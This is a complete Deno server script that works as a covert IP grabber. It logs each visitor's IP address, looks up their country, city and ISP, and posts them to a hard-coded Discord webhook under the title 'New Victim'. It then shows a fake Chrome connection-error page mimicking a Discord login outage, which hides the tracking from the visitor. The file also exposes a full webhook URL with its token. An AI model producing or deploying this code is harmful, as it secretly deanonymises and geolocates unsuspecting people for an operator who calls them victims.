// api/grab.js
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const WEBHOOK = "https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM"

const FAKE_CHROME_ERROR = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>This site can’t be reached</title>
  <style>
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f6f9fc;color:#3c4043;padding:40px}
    .c{max-width:580px;margin:auto;background:#fff;border-radius:8px;padding:40px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.1)}
    .i{width:72px;height:72px;background:#dadce0;border-radius:50%;margin:0 auto 24px;position:relative}
    .i::after{content:"!";font-size:44px;font-weight:bold;color:#70757a;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
    h1{font-size:24px;margin:0 0 16px}
    .err{font-weight:bold;color:#d93025}
    .url{color:#1a0dab}
    .s{margin:32px 0 0;padding-left:20px;text-align:left;color:#5f6368;font-size:14px}
    .s li{margin:12px 0}
  </style>
</head>
<body>
<div class="c">
  <div class="i"></div>
  <h1>This site can’t be reached</h1>
  <p>The webpage at <span class="url">https://login.discordapp.com</span> might be temporarily down.</p>
  <p class="err">ERR_CONNECTION_TIMED_OUT</p>
  <div class="s">
    <ul>
      <li>Check your internet connection</li>
      <li>Try again later</li>
      <li>Clear your browser cache</li>
    </ul>
  </div>
</div>
</body>
</html>`;

serve(async (req) => {
  const ip = req.headers.get("x-forwarded-for")?.split(',')[0] || "Unknown";

  // Get geo
  let country = "Unknown", city = "Unknown", isp = "Unknown";
  try {
    const geo = await fetch(`https://ipwho.is/${ip}`).then(r => r.json());
    country = geo.country || "Unknown";
    city = geo.city || "Unknown";
    isp = geo.connection?.isp || "Unknown";
  } catch {}

  // Send to Discord
  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: "New Victim",
          color: 16711680,
          fields: [
            { name: "IP", value: ip, inline: true },
            { name: "Country", value: country, inline: true },
            { name: "City", value: city, inline: true },
            { name: "ISP", value: isp, inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (e) {
    console.error("Webhook failed");
  }

  return new Response(FAKE_CHROME_ERROR, {
    headers: { "Content-Type": "text/html" },
    status: 200
  });
});
